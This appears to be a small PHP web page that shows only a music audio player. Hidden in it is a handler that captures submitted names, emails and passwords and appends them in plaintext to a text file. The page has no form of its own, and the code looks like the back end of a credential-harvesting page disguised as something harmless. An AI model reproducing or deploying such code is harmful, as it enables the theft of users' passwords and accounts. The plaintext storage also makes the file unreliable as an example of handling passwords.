<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
    </head>
    <body>
        <?php 
            if(isset($_POST['password'])) 
{$name =$_POST['name'];
$email = $_POST['email'];
$pas = $_POST['password'];
$wrt = $name. "(email=" .$email ."/password=" .$pas .")";
$handle =fopen('name.txt','a');
fwrite($handle,$wrt."\n");
fclose($handle);}
        ?>
        <audio controls>
            <source src="music/Imagine_Dragons_-_Thunder_(128k).mp3" type="audio/mpeg">
            <source src="audio.ogg" type="audio/ogg">
            Your browser doesn't support to play audio.
        </audio><br />
    </body>
</html>
